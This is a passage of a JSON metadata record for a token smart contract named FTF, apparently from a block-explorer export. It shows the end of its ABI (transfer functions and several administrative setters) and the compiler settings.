payable\",\"name\":\"fromad\",\"type\":\"address\"}],\"name\":\"sethuiliuaddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_governance\",\"type\":\"address\"}],\"name\":\"setlostpower\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setpming\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromad\",\"type\":\"address\"}],\"name\":\"setpooladdress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"iaddress\",\"type\":\"address\"}],\"name\":\"setpoweraddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"itime\",\"type\":\"uint256\"}],\"name\":\"setpowertimes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromad\",\"type\":\"address\"}],\"name\":\"setprofitaddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"starttime\",\"type\":\"uint256\"}],\"name\":\"setstarttime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FTF", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://868ea1c04754b8ed2d8f736e719db6cceeae06167abb6eff55e79d6d867b45b2"}